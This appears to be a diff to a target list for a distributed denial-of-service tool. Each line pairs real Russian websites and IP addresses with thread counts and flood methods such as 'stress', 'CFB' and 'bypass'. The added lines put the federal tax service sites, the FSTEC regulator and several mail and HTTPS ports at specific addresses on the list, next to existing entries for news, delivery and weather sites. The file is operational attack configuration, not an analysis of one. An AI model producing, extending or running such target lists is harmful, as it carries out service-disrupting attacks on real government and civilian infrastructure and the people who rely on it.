@@ -18,6 +18,12 @@ http://pogoda-sv.ru/monitoring/weather_forecast/  http://pogoda-sv.ru/  https://
 
 https://boxberry.ru/ https://argumenti.ru/ tcp://5.189.239.12:8888 tcp://5.189.239.12:9090 tcp://109.234.158.163:8181 tcp://109.234.158.166:8181 tcp://5.189.239.12:5000 tcp://5.189.239.12:8181 tcp://130.193.37.150:80 tcp://130.193.37.150:443 tcp://178.154.196.210:22 tcp://178.154.196.210:80 tcp://178.154.196.210:443 tcp://37.18.29.167:80 tcp://37.18.29.167:443 tcp://130.193.36.55:80 tcp://130.193.36.55:443 -t 2000 --http-methods stress
 
+https://lkdr.nalog.gov.ru/ https://nalog.gov.ru/ tcp://213.24.64.138:443 tcp://213.24.64.104:443 tcp://81.176.235.2:443 tcp://213.24.64.94:443 -t 1000 --http-methods GET
+
+https://fstec.ru/ http://fstec.ru/ -t 1000 --http-methods CFB
+
+tcp://91.189.116.40:443 tcp://91.189.116.40:993 tcp://91.189.116.40:995 tcp://91.189.116.41:443 tcp://91.189.116.41:993 tcp://91.189.116.41:995 tcp://91.189.116.42:443 tcp://91.189.116.42:993 -t 1000
+
 #https://www.meteonova.ru http://www.meteonova.ru 93.174.129.242:80 https://93.174.129.242:443 tcp://93.174.129.242:22 tcp://93.174.129.242:80 tcp://93.174.129.242:111 tcp://93.174.129.242:443 tcp://93.174.129.242:3005 -t 1000 --http-methods bypass dgb downloader
 
 #https://meteoinfo.ru http://meteoinfo.ru https://meteoinfo.ru/novosti http://193.7.160.228:80 https://193.7.160.228:443 tcp://193.7.160.228:80 tcp://193.7.160.228:443 -t 1000 --http-methods bypass stress DOWNLOADER
